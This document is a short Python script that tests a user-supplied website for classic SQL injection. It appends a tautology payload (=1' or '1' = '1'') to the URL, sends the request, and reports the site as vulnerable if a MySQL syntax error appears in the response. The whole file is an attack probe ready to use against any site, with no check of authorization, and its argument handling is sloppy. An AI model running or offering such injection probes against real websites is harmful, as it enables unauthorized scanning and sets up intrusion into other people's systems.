#importing main libraries
import sys
import urllib
import urllib.request

#selecting the input type
fullurl = input("Please specify the full vulnerable url:")

#use arguments for specifying the data
for carg in sys.argv:
    if carg == "-w":
        argnum = sys.argv.index(carg)
        argnum +=1
        fullurl = sys.argv[argnum]

#making a web request
resp = urllib.request.urlopen(fullurl + "=1\' or \'1\' = \'1\''")
body = resp.read()
fullbody = body.decode('utf-8')

#check if target is vulnerable
if "You have an error in your SQL syntax" in fullbody:
    print("The website is classic SQl injection vulnerable!")
else:
    print("The website is not classic SQl injection vulnerable!")
